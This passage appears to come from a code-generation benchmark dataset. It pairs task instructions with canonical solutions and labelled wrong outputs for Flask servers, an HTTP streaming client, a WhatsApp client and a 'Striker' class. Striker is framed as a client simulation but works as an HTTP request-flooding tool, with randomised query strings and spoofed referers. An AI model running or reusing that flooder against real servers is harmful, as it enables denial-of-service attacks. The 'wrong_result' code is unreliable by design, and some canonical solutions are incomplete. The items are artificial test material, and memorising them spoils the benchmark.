self.todos.append(todo)\n        return todo\n\n    def update(self, id, data):\n        todo = self.get(id)\n        todo.update(data)\n        return todo\n\n    def delete(self, id):\n        todo = self.get(id)\n        self.todos.remove(todo)",
    "Code_level": "Class-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nfrom flask import Flask, request\nfrom flask_restx import Api, Resource, fields, Namespace, abort\n\nclass TodoDAO:\n    def __init__(self):\n        self.counter = 0\n        self.todos = []\n\n    def get(self, id):\n        for todo in self.todos:\n            if todo['id'] == id:\n                return todo\n        abort(404, message=\"Todo {} doesn't exist\".format(id))\n\n    def create(self, data):\n        todo = data\n        todo['id'] = self.counter = self.counter + 1\n        self.todos.append(todo)\n        return todo\n\n    def update(self, id, data):\n        todo = self.get(id)\n        todo.update(data)\n        return todo\n\n    def delete(self, id):\n        todo = self.get(id)\n        self.todos.remove(todo)\n\nclass TodoAPI:\n    def __init__(self):\n        self.app = Flask(__name__)\n        self.api = Api(self.app, version='1.0', title='Todo API',\n                      description='A simple Todo API')\n        self.ns = self.api.namespace('todos', description='Todos operations')\n        self.todo = self.api.model('Todo', {\n            'id': fields.Integer(readOnly=True, description='The task unique identifier'),\n            'task': fields.String(required=True, description='The task details')\n        })\n        self.todo_dao = TodoDAO()\n        self._setup_routes()\n\n    def _setup_routes(self):\n        @self.ns.route('/')\n        class TodoList(Resource):\n            @self.ns.doc('list_todos')\n            @self.ns.marshal_list_with(self.todo)\n            def get(self):\n                '''List all tasks'''\n                return self.todo_dao.todos\n\n            @self.ns.doc('create_todo')\n            @self.ns.expect(self.todo)\n            @self.ns.marshal_with(self.todo, code=201)\n            def post(self):\n                '''Create a new task'''\n                return self.todo_dao.create(request.json), 201\n\n        @self.ns.route('/<int:id>')\n        @self.ns.response(404, 'Todo not found')\n        @self.ns.param('id', 'The task identifier')\n        class Todo(Resource):\n            @self.ns.doc('get_todo')\n            @self.ns.marshal_with(self.todo)\n            def get(self, id):\n                '''Fetch a task given its identifier'''\n                return self.todo_dao.get(id)\n\n            @self.ns.doc('delete_todo')\n            @self.ns.response(204, 'Todo deleted')\n            def delete(self, id):\n                '''Delete a task given its identifier'''\n                self.todo_dao.delete(id)\n                return '', 204\n\n            @self.ns.expect(self.todo)\n            @self.ns.marshal_with(self.todo)\n            def put(self, id):\n                '''Update a task given its identifier'''\n                return self.todo_dao.update(id, request.json)\n\n    def run(self):\n        self.app.run(debug=True)\n\nif __name__ == '__main__':\n    api = TodoAPI()\n    api.run()\n```"
  },
  {
    "Task_id": 18,
    "Instruction": "Task Description: Create a Python class that implements a streaming HTTP client capable of handling chunked transfer encoding, with support for both HTTP and HTTPS protocols, proxy configuration, and automatic reconnection logic.\n\nClass Description: The Stream class provides a robust HTTP client implementation for streaming data to a server using chunked transfer encoding. It handles connection management, automatic reconnection, proxy configuration, and SSL/TLS settings. The class is designed to maintain persistent connections and recover from network issues.\n\nAttributes:\n\nmaxtries: int - Maximum number of reconnection attempts\n_tries: int - Current number of reconnection attempts\n_delay: int - Current delay between reconnection attempts\n_closed: bool - Flag indicating if the connection is closed\n_server: str - Target server hostname\n_port: int - Target server port\n_headers: dict - HTTP headers to send with requests\n_url: str - Target URL path\n_ssl_enabled: bool - Flag for HTTPS connection\n_ssl_verification_enabled: bool - Flag for SSL certificate verification\n_conn: HTTPConnection/HTTPSConnection - The connection object\n_bytes: bytes - Buffer for received data\n\nMethods:\n\n__init__: (server, port=80, headers={}, url=\"/\", ssl_enabled=False, ssl_verification_enabled=True) -> None - Initializes the Stream object with connection parameters\nwrite: (data, reconnect_on=(\"\", 200, 502)) -> None - Sends data to the server using chunked transfer encoding\nclose: () -> str/bytes - Closes the connection and returns the server's final response\n_connect: () -> None - Establishes a new connection to the server\n_getresponse: () -> HTTPResponse/bytes - Retrieves the server's response\n_isconnected: () -> bool - Checks if the connection is still active\n_reconnect: () -> None - Attempts to reestablish a lost connection\n_reset_retries: () -> None - Resets reconnection attempt counters\n_get_ssl_context: () -> ssl.SSLContext/None - Creates SSL context based on verification settings\n_get_proxy_config: () -> tuple - Retrieves proxy configuration from environment variables",
    "Canonical_solution": "import http.client\nimport ssl\nimport time\nfrom io import StringIO\nfrom urllib.parse import urlparse, unquote\n\nclass Stream:\n    def __init__(self, server, port=80, headers={}, url=\"/\", ssl_enabled=False, ssl_verification_enabled=True):\n        self.maxtries = 5\n        self._tries = 0\n        self._delay = 1\n        self._closed = False\n        self._server = server\n        self._port = port\n        self._headers = headers\n        self._url = url\n        self._ssl_enabled = ssl_enabled\n        self._ssl_verification_enabled = ssl_verification_enabled\n        self._connect()\n\n    def write(self, data, reconnect_on=(\"\", 200, 502)):\n        if not self._isconnected():\n            response = self._getresponse()\n            if (response == \"\" and \"\" in reconnect_on) or (\n                response and isinstance(response, http.client.HTTPResponse) and response.status in reconnect_on\n            ):\n                self._reconnect()\n            elif response and isinstance(response, http.client.HTTPResponse):\n                raise Exception(\n                    \"Server responded with status code: {status_code}\\nand message: {msg}.\".format(\n                        status_code=response.status, msg=response.read()\n                    )\n                )\n            elif response == \"\":\n                raise Exception(\"Attempted to write but socket was not connected.\")\n\n        try:\n            msg = data\n            msglen = format(len(msg), \"x\")\n            self._conn.sock.setblocking(1)\n            self._conn.send(\n                \"{msglen}\\r\\n{msg}\\r\\n\".format(msglen=msglen, msg=msg).encode(\"utf-8\")\n            )\n            self._conn.sock.setblocking(0)\n        except http.client.socket.error:\n            self._reconnect()\n            self.write(data)\n\n    def _get_ssl_context(self):\n        context = None\n        if not self._ssl_verification_enabled:\n            context = ssl._create_unverified_context()\n        return context\n\n    def _connect(self):\n        server = self._server\n        port = self._port\n        headers = self._headers\n        ssl_enabled = self._ssl_enabled\n        proxy_server, proxy_port, proxy_auth = self._get_proxy_config()\n\n        if proxy_server and proxy_port:\n            if ssl_enabled:\n                context = self._get_ssl_context()\n                self._conn = http.client.HTTPSConnection(proxy_server, proxy_port, context=context)\n            else:\n                self._conn = http.client.HTTPConnection(proxy_server, proxy_port)\n\n            tunnel_headers = None\n            if proxy_auth:\n                tunnel_headers = {\"Proxy-Authorization\": proxy_auth}\n            self._conn.set_tunnel(server, port, headers=tunnel_headers)\n        else:\n            if ssl_enabled:\n                context = self._get_ssl_context()\n                self._conn = http.client.HTTPSConnection(server, port, context=context)\n            else:\n                self._conn = http.client.HTTPConnection(server, port)\n\n        self._conn.putrequest(\"POST\", self._url)\n        self._conn.putheader(\"Transfer-Encoding\", \"chunked\")\n        for header in headers:\n            self._conn.putheader(header, headers[header])\n        self._conn.endheaders()\n        self._conn.sock.setblocking(False)\n        self._bytes = b\"\"\n        self._reset_retries()\n        time.sleep(0.5)\n\n    def close(self):\n        self._reset_retries()\n        self._closed = True\n        try:\n            self._conn.send(\"\\r\\n0\\r\\n\\r\\n\".encode(\"utf-8\"))\n        except http.client.socket.error:\n            return \"\"\n        return self._getresponse()\n\n    def _getresponse(self):\n        self._conn.sock.setblocking(True)\n        response = self._bytes\n        while True:\n            try:\n                _bytes = self._conn.sock.recv(1)\n            except http.client.socket.error:\n                return b\"\"\n            if _bytes == b\"\":\n                break\n            else:\n                response += _bytes\n        self._conn.sock.setblocking(False)\n\n        if response != b\"\":\n            try:\n                response = http.client.HTTPResponse(_FakeSocket(response))\n                response.begin()\n            except:\n                response = b\"\"\n        return response\n\n    def _isconnected(self):\n        if self._closed:\n            return False\n        if self._conn.sock is None:\n            return False\n        try:\n            self._bytes = b\"\"\n            self._bytes = self._conn.sock.recv(1)\n            return False\n        except http.client.socket.error as e:\n            if e.errno == 35 or e.errno == 10035:\n                return True\n            elif e.errno == 54 or e.errno == 10054:\n                return False\n            elif e.errno == 11:\n                return True\n            elif isinstance(e, ssl.SSLError):\n                if e.errno == 2:\n                    return True\n                raise e\n            else:\n                raise e\n\n    def _reconnect(self):\n        if not self._isconnected():\n            try:\n                self._connect()\n            except http.client.socket.error as e:\n                if e.errno == 61 or e.errno == 10061:\n                    time.sleep(self._delay)\n                    self._delay += self._delay\n                    self._tries += 1\n                    if self._tries < self.maxtries:\n                        self._reconnect()\n                    else:\n                        self._reset_retries()\n                        raise e\n                else:\n                    raise e\n        self._closed = False\n\n    def _reset_retries(self):\n        self._tries = 0\n        self._delay = 1\n\n    def _get_proxy_config(self):\n        proxy_server = None\n        proxy_port = None\n        proxy_username = None\n        proxy_password = None\n        proxy_auth = None\n        ssl_enabled = self._ssl_enabled\n\n        if ssl_enabled:\n            proxy = os.environ.get(\"https_proxy\") or os.environ.get(\"HTTPS_PROXY\")\n        else:\n            proxy = os.environ.get(\"http_proxy\") or os.environ.get(\"HTTP_PROXY\")\n\n        no_proxy = os.environ.get(\"no_proxy\") or os.environ.get(\"NO_PROXY\")\n        no_proxy_url = no_proxy and self._server in no_proxy\n\n        if proxy and not no_proxy_url:\n            p = urlparse(proxy)\n            proxy_server = p.hostname\n            proxy_port = p.port\n            proxy_username = p.username\n            proxy_password = p.password\n\n        if proxy_username and proxy_password:\n            username = unquote(proxy_username)\n            password = unquote(proxy_password)\n            proxy_auth = utils.basic_auth(username, password)\n\n        return proxy_server, proxy_port, proxy_auth\n\nclass _FakeSocket(StringIO):\n    def makefile(self, *args, **kwargs):\n        return self",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport http.client\nimport ssl\nimport os\nimport time\n\nclass Stream:\n    def __init__(self, server, port=80, headers={}, url=\"/\", ssl_enabled=False, ssl_verification_enabled=True):\n        self.maxtries = 5\n        self._tries = 0\n        self._delay = 1\n        self._closed = False\n        self._server = server\n        self._port = port\n        self._headers = headers\n        self._url = url\n        self._ssl_enabled = ssl_enabled\n        self._ssl_verification_enabled = ssl_verification_enabled\n        self._conn = None\n        self._bytes = b''\n        self._connect()\n\n    def write(self, data, reconnect_on=(\"\", 200, 502)):\n        while True:\n            try:\n                self._conn.request(\"POST\", self._url, body=data, headers=self._headers)\n                response = self._getresponse()\n                status_code = response.status\n                if status_code in reconnect_on:\n                    self._reconnect()\n                else:\n                    return\n            except Exception as e:\n                self._reconnect()\n\n    def close(self):\n        if self._conn:\n            response = self._getresponse()\n            self._conn.close()\n            self._closed = True\n            return response.read()\n\n    def _connect(self):\n        if self._ssl_enabled:\n            context = self._get_ssl_context()\n            self._conn = http.client.HTTPSConnection(self._server, self._port, context=context)\n        else:\n            self._conn = http.client.HTTPConnection(self._server, self._port)\n        proxy_config = self._get_proxy_config()\n        if proxy_config:\n            self._conn.set_tunnel(*proxy_config)\n\n    def _getresponse(self):\n        return self._conn.getresponse()\n\n    def _isconnected(self):\n        return not self._closed\n\n    def _reconnect(self):\n        if self._tries < self.maxtries:\n            time.sleep(self._delay)\n            self._tries += 1\n            self._delay *= 2\n            self._connect()\n        else:\n            raise Exception(\"Max reconnection attempts reached\")\n\n    def _reset_retries(self):\n        self._tries = 0\n        self._delay = 1\n\n    def _get_ssl_context(self):\n        if self._ssl_verification_enabled:\n            return ssl.create_default_context()\n        else:\n            context = ssl.create_default_context()\n            context.check_hostname = False\n            context.verify_mode = ssl.CERT_NONE\n            return context\n\n    def _get_proxy_config(self):\n        proxy_host = os.getenv('HTTP_PROXY') or os.getenv('http_proxy')\n        if proxy_host:\n            return proxy_host.split(':')[1], int(proxy_host.split(':')[2])\n        return None\n```"
  },
  {
    "Task_id": 19,
    "Instruction": "Task Description: Create a Python class that simulates multiple HTTP clients making concurrent requests to a target server, tracking successful and failed requests, with support for both HTTP and HTTPS protocols.\n\nClass Description: Striker is a Process subclass designed to simulate multiple concurrent HTTP clients. It creates and manages multiple socket connections to a target server, sends randomized HTTP requests, tracks request counts, and handles connection cleanup.\n\nAttributes:\n- counter: [list] - Shared counter for tracking successful and failed requests (index 0 for success, 1 for failures)\n- nr_socks: [int] - Number of concurrent socket connections to maintain\n- runnable: [bool] - Control flag for the main execution loop\n- socks: [list] - List of active socket connections\n- ssl: [bool] - Flag indicating whether to use HTTPS\n- host: [str] - Target server hostname\n- url: [str] - Base URL path for requests\n- port: [int] - Target server port number\n- referers: [list] - List of referer URLs for request randomization\n\nMethods:\n- __init__(url, nr_sockets, counter) -> [None] - Initializes the Striker with target URL, connection count, and shared counter\n- run() -> [None] - Main execution loop that creates connections, sends requests, and processes responses\n- closeConnections() -> [None] - Closes all active socket connections\n- createPayload() -> [tuple] - Generates randomized request payload (URL and headers)\n- generateData() -> [tuple] - Creates request URL with random query string and headers\n- stop() -> [None] - Stops the execution loop and cleans up resources\n- incCounter() -> [None] - Increments the success counter\n- incFailed() -> [None] - Increments the failure counter",
    "Canonical_solution": "from multiprocessing import Process, Manager\nimport urlparse\nimport random\nimport sys\n\nif sys.version_info < (3,0):\n    import httplib\n    HTTPCLIENT = httplib\nelse:\n    import http.client\n    HTTPCLIENT = http.client\n\nclass Striker(Process):\n    def __init__(self, url, nr_sockets, counter):\n        super(Striker, self).__init__()\n        self.counter = counter\n        self.nr_socks = nr_sockets\n        self.runnable = True\n        self.socks = []\n        \n        parsedUrl = urlparse.urlparse(url)\n        self.ssl = parsedUrl.scheme == 'https'\n        self.host = parsedUrl.netloc.split(':')[0]\n        self.url = parsedUrl.path\n        self.port = parsedUrl.port or (443 if self.ssl else 80)\n        self.referers = [\n            'http://www.google.com/',\n            'http://www.bing.com/',\n            'http://' + self.host + '/'\n        ]\n\n    def run(self):\n        while self.runnable:\n            try:\n                for i in range(self.nr_socks):\n                    if self.ssl:\n                        c = HTTPCLIENT.HTTPSConnection(self.host, self.port)\n                    else:\n                        c = HTTPCLIENT.HTTPConnection(self.host, self.port)\n                    self.socks.append(c)\n\n                for conn_req in self.socks:\n                    (url, headers) = self.createPayload()\n                    conn_req.request('GET', url, None, headers)\n\n                for conn_resp in self.socks:\n                    resp = conn_resp.getresponse()\n                    self.incCounter()\n\n                self.closeConnections()\n            except:\n                self.incFailed()\n\n    def closeConnections(self):\n        for conn in self.socks:\n            try:\n                conn.close()\n            except:\n                pass\n\n    def createPayload(self):\n        req_url, headers = self.generateData()\n        random_keys = headers.keys()\n        random.shuffle(random_keys)\n        random_headers = {}\n        for header_name in random_keys:\n            random_headers[header_name] = headers[header_name]\n        return (req_url, random_headers)\n\n    def generateData(self):\n        param_joiner = \"&\" if self.url.count(\"?\") > 0 else \"?\"\n        request_url = self.url + param_joiner + self.generateQueryString(random.randint(1,5))\n        http_headers = self.generateRandomHeaders()\n        return (request_url, http_headers)\n\n    def stop(self):\n        self.runnable = False\n        self.closeConnections()\n        self.terminate()\n\n    def incCounter(self):\n        try:\n            self.counter[0] += 1\n        except:\n            pass\n\n    def incFailed(self):\n        try:\n            self.counter[1] += 1\n        except:\n            pass",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nimport socket\nimport ssl\nimport threading\nimport random\nimport string\n\nclass Striker(threading.Thread):\n    def __init__(self, url, nr_sockets, counter):\n        threading.Thread.__init__(self)\n        self.counter = counter\n        self.nr_socks = nr_sockets\n        self.runnable = True\n        self.socks = []\n        self.ssl = url.startswith('https')\n        self.host = url.split('/')[2]\n        self.url = url\n        self.port = 443 if self.ssl else 80\n        self.referers = [\n            'http://www.google.com/',\n            'http://www.bing.com/',\n            'http://www.yahoo.com/'\n        ]\n\n    def run(self):\n        while self.runnable:\n            self.createConnections()\n            for sock in self.socks:\n                try:\n                    self.sendRequest(sock)\n                    self.incCounter()\n                except Exception as e:\n                    self.incFailed()\n            self.closeConnections()\n\n    def closeConnections(self):\n        for sock in self.socks:\n            try:\n                sock.close()\n            except:\n                pass\n        self.socks = []\n\n    def createPayload(self):\n        url, headers = self.generateData()\n        payload = f\"GET {url} HTTP/1.1\\r\\n\"\n        payload += f\"Host: {self.host}\\r\\n\"\n        for header, value in headers.items():\n            payload += f\"{header}: {value}\\r\\n\"\n        payload += \"\\r\\n\"\n        return payload.encode()\n\n    def generateData(self):\n        url = self.url + \"?\" + \"\".join(random.choices(string.ascii_lowercase + string.digits, k=10))\n        headers = {\n            \"User-Agent\": \"Mozilla/5.0\",\n            \"Referer\": random.choice(self.referers),\n            \"Connection\": \"Keep-Alive\"\n        }\n        return url, headers\n\n    def stop(self):\n        self.runnable = False\n        self.closeConnections()\n\n    def incCounter(self):\n        self.counter[0] += 1\n\n    def incFailed(self):\n        self.counter[1] += 1\n\n    def sendRequest(self, sock):\n        payload = self.createPayload()\n        sock.sendall(payload)\n        response = sock.recv(4096)\n        if b\"HTTP/1.1 200 OK\" not in response:\n            raise Exception(\"Request failed\")\n```"
  },
  {
    "Task_id": 190,
    "Instruction": "Task Description: Create a WhatsApp client class that interacts with the WhatsApp Business API to send text messages to users.\n\nClass Description: The WhatsAppClient class encapsulates functionality for sending text messages through the WhatsApp Business API. It handles authentication, API endpoint construction, and message payload preparation.\n\nAttributes:\nAPI_URL: str - Base URL for the WhatsApp Business API (default: \"https://graph.facebook.com/v17.0/\")\nWHATSAPP_API_TOKEN: str - Temporary access token for authenticating with the WhatsApp API\nWHATSAPP_CLOUD_NUMBER_ID: str - Phone number ID associated with the WhatsApp Business account\nheaders: dict - HTTP headers containing authorization and content type information\n\nMethods:\n__init__: () -> None - Initializes the WhatsAppClient instance by setting up authorization headers and constructing the base API URL\nsend_text_message: (message: str, phone_number: str) -> int - Sends a text message to the specified phone number via WhatsApp API and returns the HTTP status code",
    "Canonical_solution": "from flask import Flask\nfrom flask import request\nimport os\nimport requests\nimport json\n\nclass WhatsAppClient:\n    API_URL = \"https://graph.facebook.com/v17.0/\"\n    WHATSAPP_API_TOKEN = \"<Temporary access token from your WhatsApp API Setup>\"\n    WHATSAPP_CLOUD_NUMBER_ID = \"<Phone number ID from your WhatsApp API Setup>\"\n\n    def __init__(self):\n        self.headers = {\n            \"Authorization\": f\"Bearer {self.WHATSAPP_API_TOKEN}\",\n            \"Content-Type\": \"application/json\",\n        }\n        self.API_URL = self.API_URL + self.WHATSAPP_CLOUD_NUMBER_ID\n\n    def send_text_message(self, message, phone_number):\n        payload = {\n            \"messaging_product\": 'whatsapp',\n            \"to\": phone_number,\n            \"type\": \"text\",\n            \"text\": {\n                \"preview_url\": False,\n                \"body\": message\n            }\n        }\n        response = requests.post(f\"{self.API_URL}/messages\", json=payload, headers=self.headers)\n        print(response.status_code)\n        assert response.status_code == 200, \"Error sending message\"\n        return response.status_code\n\napp = Flask(__name__)\n\n@app.route('/msgrcvd', methods=['POST', 'GET'])\ndef msgrcvd():\n    message = request.args.get('message')\n    answer = llm(message)\n    print(message)\n    print(answer)\n    client.send_text_message(llm(message), \"<your phone number>\")\n    return message + \"<p/>\" + answer",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "```python\nclass WhatsAppClient:\n    API_URL = \"https://graph.facebook.com/v17.0/\"\n    \n    def __init__(self, whatsapp_api_token: str, whatsapp_cloud_number_id: str):\n        self.WHATSAPP_API_TOKEN = whatsapp_api_token\n        self.WHATSAPP_CLOUD_NUMBER_ID = whatsapp_cloud_number_id\n        self.headers = {\n            \"Authorization\": f\"Bearer {self.WHATSAPP_API_TOKEN}\",\n            \"Content-Type\": \"application/json\"\n        }\n    \n    def send_text_message(self, message: str, phone_number: str) -> int:\n        endpoint = f\"{self.API_URL}{self.WHATSAPP_CLOUD_NUMBER_ID}/messages\"\n        payload = {\n            \"messaging_product\": \"whatsapp\",\n            \"to\": phone_number,\n            \"type\": \"text\",\n            \"text\": {\n                \"body\": message\n            }\n        }\n        \n        import requests\n        response = requests.post(endpoint, headers=self.headers, json=payload)\n        return response.status_code\n```"
  },
  {
    "Task_id": 191,
    "Instruction": "Task Description: Create a Flask-based HTTP server that simulates a RocketMap API endpoint server, capable of generating and returning mock data for gyms and pok\u00e9stops based on geographic coordinates and radius.\n\nFunction Description: The server provides three main endpoints:\n1. Root endpoint ('/') - Returns a simple welcome message\n2. Login endpoint ('/login/<lat>/<lng>/<r>') - Generates and returns gym and pok\u00e9stop data within a specified radius of given coordinates\n3. Scan endpoint ('/scan/<lat>/<lng>') - Returns mock scan data including nearby forts and wild pok\u00e9mons for given coordinates\n\nInput:\n- For root endpoint: None\n- For login endpoint:\n  - lat: [string] - Latitude coordinate as string\n  - lng: [string] - Longitude coordinate as string\n  - r: [string] - Radius in meters as string\n- For scan endpoint:\n  - lat: [string] - Latitude coordinate as string\n  - lng: [string] - Longitude coordinate as string\n\nOutput:\n- For root endpoint: [string] - Welcome message\n- For login endpoint: [JSON] - List of generated gyms and pok\u00e9stops with their properties\n- For scan endpoint: [JSON] - Mock scan data including cells with forts and wild pok\u00e9mons",
    "Canonical_solution": "from flask import Flask, jsonify\napp = Flask(__name__)\n\n@app.route('/')\ndef api_root():\n    return 'This here be a Fake RocketMap API Endpoint Server'\n\n@app.route('/login/<lat>/<lng>/<r>')\ndef api_login(lat, lng, r):\n    global forts\n\n    if len(forts):\n        # already generated\n        return jsonify(forts)\n\n    # coerce types\n    r = int(r)  # radius in meters\n    lat = float(lat)\n    lng = float(lng)\n\n    forts = []\n    area = 3.14 * (r * r)\n\n    # One gym every N sq.m\n    gymCount = int(math.ceil(area / 25000))\n\n    # One pks every N sq.m\n    pksCount = int(math.ceil(area / 15000))\n\n    # Gyms\n    for i in range(gymCount):\n        coords = getRandomPoint(location=(lat, lng), maxMeters=r)\n        forts.append({\n            'enabled': True,\n            'guard_pokemon_id': randint(1, 140),\n            'gym_points': randint(1, 30000),\n            'id': 'gym-{}'.format(i),\n            'is_in_battle': not getrandbits(1),\n            'last_modified_timestamp_ms': int((time() - 10) * 1000),\n            'latitude': coords[0],\n            'longitude': coords[1],\n            'owned_by_team': randint(0, 3)\n        })\n\n    # Pokestops\n    for i in range(pksCount):\n        coords = getRandomPoint(location=(lat, lng), maxMeters=r)\n        forts.append({\n            'enabled': True,\n            'id': 'pks-{}'.format(i),\n            'last_modified_timestamp_ms': int((time() - 10) * 1000),\n            'latitude': coords[0],\n            'longitude': coords[1],\n            'type': 1\n        })\n\n    log.info('Login for location %f,%f generated %d gyms, %d pokestop', lat,\n             lng, gymCount, pksCount)\n    return jsonify(forts)\n\n@app.route('/scan/<lat>/<lng>')\ndef api_scan(lat, lng):\n    location = (float(lat), float(lng))\n    cells = []\n    # for i in range(randint(60,70)):\n    for i in range(3):\n        cells.append({\n            'current_timestamp_ms': int(time() * 1000),\n            'forts': getForts(location),\n            's2_cell_id': uuid4(),  # wrong, but also unused so it\n                                    # doesn't matter\n            'wild_pokemons': makeWildPokemon(location),\n            'catchable_pokemons': [],  # unused\n            'nearby_pokemons': []  # unused\n        })\n    return jsonify({'responses': {'GET_MAP_OBJECTS': {'map_cells': cells}}})",
    "Code_level": "Function-level",
    "FSMID_for_test": 60,
    "wrong_result": "from flask import Flask, jsonify\nimport random\nimport math\n\napp = Flask(__name__)\n\n# Mock data generator functions\ndef generate_gym():\n    return {\n        \"id\": str(random.randint(1000, 9999)),\n        \"name\": f\"Gym {random.randint(1, 100)}\",\n        \"latitude\": round(random.uniform(-90, 90), 6),\n        \"longitude\": round(random.uniform(-180, 180), 6),\n        \"team_id\": random.choice([1, 2, 3])\n    }\n\ndef generate_pokestop():\n    return {\n        \"id\": str(random.randint(1000, 9999)),\n        \"name\": f\"Pokestop {random.randint(1, 100)}\",\n        \"latitude\": round(random.uniform(-90, 90), 6),\n        \"longitude\": round(random.uniform(-180, 180), 6),\n        \"items\": [random.randint(1, 100) for _ in range(5)]\n    }\n\ndef generate_scan(lat, lng):\n    return {\n        \"cells\": [\n            {\n                \"s2_cell_id\": random.randint(1000000000000000000, 9999999999999999999),\n                \"forts\": [generate_gym(), generate_pokestop()],\n                \"wild_pokemons\": [{\"pokemon_id\": random.randint(1, 800)} for _ in range(5)]\n            }\n        ]\n    }\n\n@app.route('/')\ndef welcome():\n    return \"Welcome to the RocketMap API Mock Server!\"\n\n@app.route('/login/<lat>/<lng>/<r>')\ndef login(lat, lng, r):\n    radius = float(r)\n    gyms = [generate_gym() for _ in range(10)]\n    pokestops = [generate_pokestop() for _ in range(10)]\n    return jsonify({\"gyms\": gyms, \"pokestops\": pokestops})\n\n@app.route('/scan/<lat>/<lng>')\ndef scan(lat, lng):\n    return jsonify(generate_scan(float(lat), float(lng)))\n\nif __name__ == '__main__':\n    app.run(debug=True)"
  },
  {
    "Task_id": 199,
    "Instruction": "Task Description: Create a Flask-based HTTP server to visualize and navigate through a robot dataset, allowing users to view different episodes and associated metadata.\n\nFunction Description: The `run_server` function initializes and runs a Flask web server that provides a user interface for exploring robot datasets. It handles dataset navigation, episode selection, and displays relevant information including videos and task descriptions. The server supports both local datasets and remote datasets hosted on Hugging Face.\n\nInput:\n- dataset: Union[LeRobotDataset, IterableNamespace, None] - The dataset to visualize (can be None if loading from URL)\n- episodes: Optional[List[int]] - List of episode IDs to make available (None for all episodes)\n- host: str - Host address to run the server on\n- port: str - Port number to run the server on\n- static_folder: Path - Path to static files directory\n- template_folder: Path - Path to HTML templates directory\n\nOutput: None (runs a Flask server indefinitely until interrupted)\n\nMethods (route handlers):\n1. homepage() -> Union[Redirect, Response] - Handles root URL, redirects to first episode or shows dataset selection page\n2. show_first_episode(dataset_namespace: str, dataset_name: str) -> Redirect - Redirects to the first episode of a specified dataset\n3. show_episode(dataset_namespace: str, dataset_name: str, episode_id: int) -> Union[Response, Tuple[str, int]] - Displays detailed information for a specific episode including videos and task data\n\nThe server provides the following features:\n- Dataset version validation\n- Episode navigation\n- Video playback\n- Task description display\n- Data visualization\n- Support for both local and remote datasets\n- Featured datasets showcase",
    "Canonical_solution": "import argparse\nimport json\nimport logging\nimport re\nimport shutil\nimport tempfile\nfrom pathlib import Path\n\nimport requests\nfrom flask import Flask, redirect, render_template, request, url_for\n\ndef run_server(\n    dataset: LeRobotDataset | IterableNamespace | None,\n    episodes: list[int] | None,\n    host: str,\n    port: str,\n    static_folder: Path,\n    template_folder: Path,\n):\n    app = Flask(__name__, static_folder=static_folder.resolve(), template_folder=template_folder.resolve())\n    app.config[\"SEND_FILE_MAX_AGE_DEFAULT\"] = 0  # specifying not to cache\n\n    @app.route(\"/\")\n    def hommepage(dataset=dataset):\n        if dataset:\n            dataset_namespace, dataset_name = dataset.repo_id.split(\"/\")\n            return redirect(\n                url_for(\n                    \"show_episode\",\n                    dataset_namespace=dataset_namespace,\n                    dataset_name=dataset_name,\n                    episode_id=0,\n                )\n            )\n\n        dataset_param, episode_param = None, None\n        all_params = request.args\n        if \"dataset\" in all_params:\n            dataset_param = all_params[\"dataset\"]\n        if \"episode\" in all_params:\n            episode_param = int(all_params[\"episode\"])\n\n        if dataset_param:\n            dataset_namespace, dataset_name = dataset_param.split(\"/\")\n            return redirect(\n                url_for(\n                    \"show_episode\",\n                    dataset_namespace=dataset_namespace,\n                    dataset_name=dataset_name,\n                    episode_id=episode_param if episode_param is not None else 0,\n                )\n            )\n\n        featured_datasets = [\n            \"lerobot/aloha_static_cups_open\",\n            \"lerobot/columbia_cairlab_pusht_real\",\n            \"lerobot/taco_play\",\n        ]\n        return render_template(\n            \"visualize_dataset_homepage.html\",\n            featured_datasets=featured_datasets,\n            lerobot_datasets=available_datasets,\n        )\n\n    @app.route(\"/<string:dataset_namespace>/<string:dataset_name>\")\n    def show_first_episode(dataset_namespace, dataset_name):\n        first_episode_id = 0\n        return redirect(\n            url_for(\n                \"show_episode\",\n                dataset_namespace=dataset_namespace,\n                dataset_name=dataset_name,\n                episode_id=first_episode_id,\n            )\n        )\n\n    @app.route(\"/<string:dataset_namespace>/<string:dataset_name>/episode_<int:episode_id>\")\n    def show_episode(dataset_namespace, dataset_name, episode_id, dataset=dataset, episodes=episodes):\n        repo_id = f\"{dataset_namespace}/{dataset_name}\"\n        try:\n            if dataset is None:\n                dataset = get_dataset_info(repo_id)\n        except FileNotFoundError:\n            return (\n                \"Make sure to convert your LeRobotDataset to v2 & above. See how to convert your dataset at https://github.com/huggingface/lerobot/pull/461\",\n                400,\n            )\n        dataset_version = (\n            dataset.meta._version if isinstance(dataset, LeRobotDataset) else dataset.codebase_version\n        )\n        match = re.search(r\"v(\\d+)\\.\", dataset_version)\n        if match:\n            major_version = int(match.group(1))\n            if major_version < 2:\n                return \"Make sure to convert your LeRobotDataset to v2 & above.\"\n\n        episode_data_csv_str, columns = get_episode_data(dataset, episode_id)\n        dataset_info = {\n            \"repo_id\": f\"{dataset_namespace}/{dataset_name}\",\n            \"num_samples\": dataset.num_frames\n            if isinstance(dataset, LeRobotDataset)\n            else dataset.total_frames,\n            \"num_episodes\": dataset.num_episodes\n            if isinstance(dataset, LeRobotDataset)\n            else dataset.total_episodes,\n            \"fps\": dataset.fps,\n        }\n        if isinstance(dataset, LeRobotDataset):\n            video_paths = [\n                dataset.meta.get_video_file_path(episode_id, key) for key in dataset.meta.video_keys\n            ]\n            videos_info = [\n                {\"url\": url_for(\"static\", filename=video_path), \"filename\": video_path.parent.name}\n                for video_path in video_paths\n            ]\n            tasks = dataset.meta.episodes[0][\"tasks\"]\n        else:\n            video_keys = [key for key, ft in dataset.features.items() if ft[\"dtype\"] == \"video\"]\n            videos_info = [\n                {\n                    \"url\": f\"https://huggingface.co/datasets/{repo_id}/resolve/main/\"\n                    + dataset.video_path.format(\n                        episode_chunk=int(episode_id) // dataset.chunks_size,\n                        video_key=video_key,\n                        episode_index=episode_id,\n                    ),\n                    \"filename\": video_key,\n                }\n                for video_key in video_keys\n            ]\n\n            response = requests.get(\n                f\"https://huggingface.co/datasets/{repo_id}/resolve/main/meta/episodes.jsonl\"\n            )\n            response.raise_for_status()\n            # Split into lines and parse each line as JSON\n            tasks_jsonl = [json.loads(line) for line in response.text.splitlines() if line.strip()]\n\n            filtered_tasks_jsonl = [row for row in tasks_jsonl if row[\"episode_index\"] == episode_id]\n            tasks = filtered_tasks_jsonl[0][\"tasks\"]\n\n        videos_info[0][\"language_instruction\"] = 